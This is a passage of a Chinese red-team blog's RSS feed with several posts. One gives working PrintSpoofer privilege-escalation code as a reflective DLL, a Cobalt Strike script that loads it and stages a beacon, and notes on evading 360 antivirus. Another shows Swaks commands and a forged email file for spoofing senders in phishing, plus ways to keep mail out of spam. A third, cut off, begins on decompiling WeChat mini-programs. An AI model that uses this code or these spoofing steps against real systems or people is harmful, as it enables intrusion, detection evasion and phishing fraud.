  &lt;li&gt;BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck); 检查是否有模拟特权&lt;/li&gt;
  &lt;li&gt;BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName); 随机生成管道名，防止被杀软记录（这也是和BadPotato\pipePotato不同的地方）&lt;/li&gt;
  &lt;li&gt;HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName); 创建恶意命名管道服务端&lt;/li&gt;
  &lt;li&gt;HANDLE ConnectSpoolNamedPipe(HANDLE hPipe); 异步连接命名管道&lt;/li&gt;
  &lt;li&gt;HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName); 触发打印机进程命名管道连接&lt;/li&gt;
  &lt;li&gt;DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam);  同上&lt;/li&gt;
  &lt;li&gt;BOOL GetSystem(HANDLE hPipe); 模拟令牌等&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TriggerNamedPipeConnectionThread()&lt;/code&gt;这个函数中实现了SpoolSample的功能&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721022126500.png&quot; alt=&quot;image-20230721022126500&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;顺便看了看和PrintSpooler相同原理实现的，同一时期的&lt;a href=&quot;https://github.com/BeichenDream/BadPotato&quot;&gt;BadPotato&lt;/a&gt;，&lt;a href=&quot;https://github.com/daikerSec/pipePotato&quot;&gt;pipePotato&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;大概来说，BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低），其他的大差不差&lt;/p&gt;

&lt;h1 id=&quot;免杀尝试&quot;&gt;免杀尝试&lt;/h1&gt;

&lt;p&gt;拿BadPotato做个尝试&lt;/p&gt;

&lt;p&gt;落地静态查杀的话，直接把所有Console输出语句替换就行，但是仅仅这样过不了动态&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Console\.WriteLine\((.*?); //直接正则替换完事了
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721215648985.png&quot; alt=&quot;image-20230721215648985&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721215834751.png&quot; alt=&quot;image-20230721215834751&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下面就是看看动态了，用procmon看进程断在哪里，发现badPotato到创建cmd进程时360会提示提权风险，很明显不允许当前进程创建的新进程权限比当前的高，还是System权限的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721221230199.png&quot; alt=&quot;image-20230721221230199&quot; style=&quot;zoom:70%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230721222327163.png&quot; alt=&quot;image-20230721222327163&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后思路断了，功力不够。正好逛到Crisprx师傅的反射注入DLL结合CS免杀，用PrintSpooler实现的。学习下思路&lt;/p&gt;

&lt;p&gt;使用的反射DLL注入项目的地址，&lt;a href=&quot;https://github.com/stephenfewer/ReflectiveDLLInjection&quot;&gt;stephenfewer/ReflectiveDLLInjection:&lt;/a&gt;，并且一般CS中编写反射注入DLL基本都是使用的该项目&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;导入相关的头文件：ReflectiveDllInjection.h、ReflectiveLoader.cpp、ReflectiveLoader.h&lt;/li&gt;
  &lt;li&gt;将原来部分提权的操作放到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt;中，主要是放在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DLL_PROCESS_ATTACH&lt;/code&gt;中&lt;/li&gt;
  &lt;li&gt;这里贴下&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dllmain.cpp&lt;/code&gt;的代码：&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &quot;ReflectiveLoader.h&quot;
#include &quot;PrintSpoofer.h&quot;
#include &amp;lt;iostream&amp;gt;
 
extern HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
BOOL PrintSpoofer() {
    BOOL bResult = TRUE;
    LPWSTR pwszPipeName = NULL;
    HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
    HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
    HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
    DWORD dwWait = 0;
 
    if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME)) {
        wprintf(L&quot;[-] A privilege is missing: &apos;%ws&apos;\n&quot;, SE_IMPERSONATE_NAME);
        bResult = FALSE;
        goto cleanup;
    }
 
    wprintf(L&quot;[+] Found privilege: %ws\n&quot;, SE_IMPERSONATE_NAME);
 
    if (!GenerateRandomPipeName(&amp;amp;pwszPipeName)) {
        wprintf(L&quot;[-] Failed to generate a name for the pipe.\n&quot;);
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName))) {
        wprintf(L&quot;[-] Failed to create a named pipe.\n&quot;);
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe))) {
        wprintf(L&quot;[-] Failed to connect the named pipe.\n&quot;);
        bResult = FALSE;
        goto cleanup;
    }
 
    wprintf(L&quot;[+] Named pipe listening...\n&quot;);
 
    if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName))) {
        wprintf(L&quot;[-] Failed to trigger the Spooler service.\n&quot;);
        bResult = FALSE;
        goto cleanup;
    }
 
    dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
    if (dwWait != WAIT_OBJECT_0) {
        wprintf(L&quot;[-] Operation failed or timed out.\n&quot;);
        bResult = FALSE;
        goto cleanup;
    }
 
    if (!GetSystem(hSpoolPipe)) {
        bResult = FALSE;
        goto cleanup;
    }
    wprintf(L&quot;[+] Exploit successfully, enjoy your shell\n&quot;);
 
cleanup:
    if (hSpoolPipe)
        CloseHandle(hSpoolPipe);
    if (hSpoolPipeEvent)
        CloseHandle(hSpoolPipeEvent);
    if (hSpoolTriggerThread)
        CloseHandle(hSpoolTriggerThread);
 
    return bResult;
}
 
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    BOOL bReturnValue = TRUE;
    DWORD dwResult = 0;
 
    switch (dwReason) {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        if (PrintSpoofer()) {
            fflush(stdout);
 
            if (lpReserved != NULL)
                ((VOID(*)())lpReserved)();
        } else {
            fflush(stdout);
        }
 
        ExitProcess(0);
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;cna编写&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sub printspoofer {
    btask($1, &quot;Task Beacon to run &quot; . listener_describe($2) . &quot; via PrintSpoofer&quot;);
 
    if (-is64 $1)
    {
        $arch = &quot;x64&quot;;
        $dll = script_resource(&quot;PrintSpoofer.x64.dll&quot;);
    } else {
        $arch = &quot;x86&quot;;
        $dll = script_resource(&quot;PrintSpoofer.x86.dll&quot;);
    }
    $stager = shellcode($2, false, $arch);
 
    bdllspawn!($1, $dll, $stager, &quot;PrintSpoofer local elevate privilege&quot;, 5000);
 
    bstage($1, $null, $2, $arch);
}
 
beacon_exploit_register(&quot;PrintSpoofer&quot;, &quot;PrintSpoofer local elecate privilege&quot;, &amp;amp;printspoofer);
 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;生成DLL文件，调用脚本，依然是生效的&lt;/p&gt;

&lt;p&gt;最终效果，很多cs插件没有集成这个PrintSpooler，Taowu插件集里有，其实现思路也如上，建议集成到自己的cs工具库上。有些情况下它比BadPotato等好用&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230722015144155.png&quot; alt=&quot;image-20230722015144155&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;大致完。由于微软对SpoolSample给出的结论也是“预期行为”，理论上只要打印机后台服务程序启动，并且具有模拟特权，我们都能成功利用。So，利用前不妨&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps | findstr &quot;spoolsv&quot;&lt;/code&gt;一下看看有没有打印机服务进程&lt;/p&gt;

&lt;h1 id=&quot;learn-from&quot;&gt;Learn From&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/#getting-a-system-token&quot;&gt;PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n’s blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/&quot;&gt;Windows Named Pipes &amp;amp; Impersonation – Decoder’s Blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_36119192/article/details/112274131&quot;&gt;浅析Windows命名管道Named Pipe_named pipes_谢公子的博客&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.crisprx.top/archives/484#i-4&quot;&gt;PrintSpoofer提权原理探究 – Crispr –热爱技术和生活 (crisprx.top)&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 24 Jul 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html</link>
        <guid isPermaLink="true">http://localhost:4000/potatoes%E5%AE%B6%E6%97%8F/2023/07/24/Windows%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%8B%9F%E5%92%8CPrintSpoofer%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6.html</guid>
        
        
        <category>Potatoes家族</category>
        
      </item>
    
      <item>
        <title>红队邮差-邮件安全协议和Swaks伪造邮件</title>
        <description>&lt;h1 id=&quot;文前漫谈&quot;&gt;文前漫谈&lt;/h1&gt;

&lt;p&gt;打不进去，研究研究钓鱼，21年的DataCon有这个内容，按照paper来的&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://datacon.qianxin.com/blog/archives/277&quot;&gt;DataCon2021优秀解题思路分享-邮件发件人伪造（武汉大学 10TG） – DataCon社区 (qianxin.com)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;钓鱼邮件还是关注两部分的内容，发件人伪造和如何不进垃圾箱。&lt;/p&gt;

&lt;h1 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h1&gt;

&lt;p&gt;邮件发件协议主要是SMTP(Simple Mail Transfer Protocol)，但是SMTP协议设计之初并没有考虑到太多安全相关的功能，因此导致邮件发件人伪造的攻击层出不穷。&lt;/p&gt;

&lt;p&gt;一个典型的邮件从发送方编写到接收方看到邮件内容的过程如下图所示&lt;/p&gt;

&lt;p&gt;邮件发送流程图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20211027142825953-1689046605295-4.png&quot; alt=&quot;邮件发送流程图&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;发送方通过SMTP协议发给发送方的MTA(Mail Transmission Agent)&lt;/li&gt;
  &lt;li&gt;发送方的MTA通过SMTP协议发给接收方的MTA&lt;/li&gt;
  &lt;li&gt;最终接收方使用POP3(Post Office Protocol)或IMAP(Internet Message Access Protocol)协议接收邮件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;需要注意的是，SMTP协议只能发送邮件，不接受邮件，邮件的接收需要POP3或IMAP来完成&lt;/p&gt;

&lt;p&gt;在这个过程中传输的邮件有很多个字段都是用来指定发送方身份的&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MailFrom &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMTP.From&lt;/code&gt;, 这个字段可以理解为信封上指定的发件人&lt;/li&gt;
  &lt;li&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message.From&lt;/code&gt;, 展示给用户看到的信息上的发件人&lt;/li&gt;
  &lt;li&gt;Sender, 一般在代发邮件中用来标识代发邮件的来源&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这些多种的字段就导致实际邮件服务解析时不同邮件客户端可能对显示的内容处理方案不同，从而就导致了发件人伪造的攻击。&lt;/p&gt;

&lt;h1 id=&quot;0x02-邮件安全协议&quot;&gt;0x02 邮件安全协议&lt;/h1&gt;

&lt;p&gt;由于SMTP设计时并没有考虑相关的安全机制，并没有确定邮件来源、邮件内容的可信，为了保证其安全性陆续推出了SPF、DKIM、DMARC等安全协议。&lt;/p&gt;

&lt;h2 id=&quot;spf-域名验证协议&quot;&gt;SPF 域名验证协议&lt;/h2&gt;

&lt;p&gt;SPF，Sender Policy Framework（发件人策略框架），主要作用是防止伪造邮件地址&lt;/p&gt;

&lt;p&gt;SPF记录的本质，是向收件人宣告：本域名的邮件从清单上所列IP发出的都是合法邮件。当在DNS中定义了域名的SPF记录后，为了确认邮件声称发件人不是伪造的，邮件接收方首先检查邮件域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录中，若包含，则认为是一封正确的邮件，返回 PASS，否则认为是一封伪造的邮件并退回，或将其标记为垃圾/仿冒邮件，返回 FAIL。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;v=spf1 -all&quot; （拒绝所有，表示这个域名不会发出邮件）
&quot;v=spf1 +all&quot; （接受所有）
&quot;v=spf1 ip4:192.168.0.1/16 -all&quot;（只允许 192.168.0.1/16 范围内的IP发送邮件）
&quot;v=spf1 mx -all&quot;（允许当前域名的 mx 记录对应的IP地址发送邮件）
&quot;v=spf1 mx mx:test.example.com -all&quot;（允许当前域名和 test.example.com 的 mx 记录对应的IP地址发送邮件）
&quot;v=spf1 a mx ip4:173.194.72.103 -all&quot;（允许当前域名的 a 记录和 mx 记录和一个给定的IP地址发送邮件）
&quot;v=spf1 include:example.com -all&quot;（采用和 example.com 一样的SPF记录）
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以qq.com为例&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230711210048805.png&quot; alt=&quot;image-20230711210048805&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;dkim-邮件防篡改协议&quot;&gt;DKIM 邮件防篡改协议&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20211114120702953.png&quot; alt=&quot;image-20211114120702953&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DKIM是利用到密码学的签名协议，发件方首先需要在DNS记录上增加自己的公钥，发件时使用自己的私钥对邮件的内容进行签名，并将签名的结果写在邮件内容中，当收件人收到信件时向DNS请求公钥对信件内容进行校验。&lt;/p&gt;

&lt;p&gt;DKIM中几个比较重要的字段有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;d 表示实际校验的域名&lt;/li&gt;
  &lt;li&gt;h 表示签名内容的涵盖范围&lt;/li&gt;
  &lt;li&gt;l 是可选参数，表示body的长度&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中l这个参数最初的目的是用于一些商业邮件底部的Unsubscribe相关按钮&lt;/p&gt;

&lt;p&gt;指定了l参数的邮件有可能被伪造body&lt;/p&gt;

&lt;h2 id=&quot;dmarc-身份验证协议&quot;&gt;DMARC 身份验证协议&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20211114124939276.png&quot; alt=&quot;image-20211114124939276&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于SPF协议只能保证发件人的IP是否是域名允许的IP，DKIM只能保证邮件的内容没有经过篡改，两者都没有保护最终收件人看到的From字段是否是一个正确且真实的，因此增加了DMARC协议。&lt;/p&gt;

&lt;p&gt;DMARC协议会根据SPF、DKIM两者验证的返回结果，以及对From字段做的&lt;strong&gt;一致性检查&lt;/strong&gt;，最终给出一个结论，判断这封邮件是应当拒收还是接收。&lt;/p&gt;

&lt;h1 id=&quot;邮件伪造工具-swaks&quot;&gt;邮件伪造工具 Swaks&lt;/h1&gt;

&lt;p&gt;Swaks 命令行邮件伪造工具&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;–to test@gmail.com //接件人邮箱；
–from test@qq.com //发件人邮箱；
–ehlo qq.com //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证；
–server mail.smtp2go.com //服务邮件域
–body “test” //引号中的内容即为邮件正文，可直接引用文件；
–data ./Desktop/email.txt //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；
–header “Subject:标题” //邮件标题;
–header-X-Mailer gmail.com //X-Mailer标头表示用于起草和发送原始电子邮件的程序
–h-From: &apos;boss admin@gmail.com&apos; //伪造的发件人邮箱；
–attach /root/test.txt //附件，必须是绝对路径
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;spf-绕过&quot;&gt;SPF 绕过&lt;/h1&gt;

&lt;p&gt;首先判断是否邮箱地址是否配置了SPF，将结合和上面的描述对照&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dig -t txt qq.com  //linux&lt;/li&gt;
  &lt;li&gt;nslookup -type=txt qq.com //windows&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;不存在spf&quot;&gt;不存在SPF&lt;/h2&gt;

&lt;p&gt;指定From字段伪造发件人，不存在SPF时伪造较为简单，但是这里仅仅时网易邮箱客户端的，并没有放入垃圾箱。qq邮箱客户端等会直接放入垃圾箱&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;swaks -to p001water@163.com -from root@seebug.org \
--header-X-Mailer SMTP  --ehlo seebug.org --body &apos;这是钓鱼内容&apos; \	
--attach /app/email/fish.docx --header &quot;Subject:这是一封钓鱼邮件&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/3.jpg&quot; alt=&quot;3&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;存在spf&quot;&gt;存在SPF&lt;/h2&gt;

&lt;h3 id=&quot;message-body绕过&quot;&gt;Message Body绕过&lt;/h3&gt;

&lt;p&gt;以qq.com为例，把From字段写在body里&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;swaks --to p001water@163.com --data /app/email/level.eml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;From: admin@qq.com
Subject:这是一封钓鱼邮件
X-Mailer: SMTP
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_7617&quot;
X-CM-TRANSID:_____wBXGAQvQK5knv03AA--.3326S2
Authentication-Results: zwqz-mx-mta-g0-0; spf=none smtp.mail=root@seeb
	ug.org;
X-Coremail-Antispam: 1Uf129KBjDUn29KB7ZKAUJUUUUU529EdanIXcx71UUUUU7v73
	VFW2AGmfu7bjvjm3AaLaJ3UbIYCTnIWIevJa73UjIFyTuYvjxUIdcTDUUUU

------=_MIME_BOUNDARY_000_7617
Content-Type: text/plain

这是钓鱼内容
------=_MIME_BOUNDARY_000_7617
Content-Type: application/octet-stream; name=&quot;fish.docx&quot;
Content-Description: fish.docx
Content-Disposition: attachment; filename=&quot;fish.docx&quot;
Content-Transfer-Encoding: BASE64

dGVzdAo=

------=_MIME_BOUNDARY_000_7617--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;缺点就是会显示代发提醒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230712163022999.png&quot; alt=&quot;image-20230712163022999&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;邮件代发&quot;&gt;邮件代发&lt;/h3&gt;

&lt;p&gt;找有信誉的SMTP服务器转发邮件增加可信度，避免邮件直接扔进垃圾箱。缺点就是会有代发记录，现在的思路就是利用邮件客户端的UI Rendering绕过&lt;/p&gt;

&lt;p&gt;常用的代发平台&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.sendcloud.net/ //注册简单，推荐
https://www.smtp2go.com/ //注册难
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;说实话，也挺麻烦&lt;/p&gt;

&lt;h1 id=&quot;如何不进垃圾箱&quot;&gt;如何不进垃圾箱&lt;/h1&gt;

&lt;p&gt;比较中肯的方法还是选择邮件代发平台代发，是否被放入垃圾箱也看对方邮件客户端的安全规则。如果是网易的客户端，直接发也不会被放入垃圾箱&lt;/p&gt;

&lt;p&gt;客户端规则较严直接就进垃圾箱了。或者自己配置邮件服务器，SPF，DKIM，DMARC都通过验证。否则还是只进垃圾箱。&lt;/p&gt;

&lt;p&gt;没找到什么好的方法，没突破。暂完&lt;/p&gt;

</description>
        <pubDate>Sat, 08 Jul 2023 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/2023/07/08/%E7%BA%A2%E9%98%9F%E9%82%AE%E5%B7%AE-%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E5%92%8CSwaks%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/2023/07/08/%E7%BA%A2%E9%98%9F%E9%82%AE%E5%B7%AE-%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E5%92%8CSwaks%E4%BC%AA%E9%80%A0%E9%82%AE%E4%BB%B6.html</guid>
        
        
        <category>邮件钓鱼</category>
        
      </item>
    
      <item>
        <title>渗透技巧-vx小程序实例分析和反编译拿源码</title>
        <description>&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;

&lt;p&gt;无论是攻防演练还是SRC挖掘，小程序渗透测试已经成为了传统web打点之外、信息收集的重要一步。&lt;/p&gt;

&lt;p&gt;17年微信小程序上线，vx小程序的定位是一种全新的连接用户与服务的方式，它可以在微信内被便捷地获取和传播，同时具有出色的使用体验&lt;/p&gt;

&lt;p&gt;小程序并非凭空冒出来的一个概念。当微信中的 WebView 逐渐成为移动 Web 的一个重要入口时，微信就有相关的 JS API 了。&lt;/p&gt;

&lt;p&gt;它的主要开发语言也是 JavaScript ，小程序的开发同普通的网页开发相比有很大的相似性。因为是JavaScript，所以还是基于用户端运行，也就出现了小程序反编译导致信息泄露的可能。下面就从一个实际项目了解vx小程序的项目结构&lt;/p&gt;

&lt;h1 id=&quot;小程序项目结构&quot;&gt;小程序项目结构&lt;/h1&gt;

&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/yllg/WXxcx&quot;&gt;yllg/WXxcx: 微信小程序-e生活&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在微信开发者工具中导入e生活项目，打开后IDE自动开启热加载&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/image-20230708155711894.png&quot; alt=&quot;image-20230708155711894&quot; style=&quot;zoom:60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;小程序包含一个描述整体程序的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app&lt;/code&gt; 和多个描述各自页面的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;page&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;文件&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;必需&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;作用&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/app-service/app.html&quot;&gt;app.js&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;是&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;小程序逻辑&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/config.html&quot;&gt;app.json&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;是&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;小程序公共配置，是当前小程序的全局配置，包括了小程序的所有页面路径、界面表现、网络超时时间、底部 tab 等&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html&quot;&gt;app.wxss&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;否&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;小程序公共样式表（相当于css样式表）&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;​	一个小程序页面部分由四个文件组成，通常放在pages目录下，分别是：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;文件类型&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;必需&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;作用&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/app-service/page.html&quot;&gt;.js&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;是&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;页面逻辑&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/&quot;&gt;.wxml&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;是&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;页面结构&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#页面配置&quot;&gt;.json&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;否&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;页面配置&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxss.html&quot;&gt;.wxss&lt;/a&gt;&lt;/td&gt;
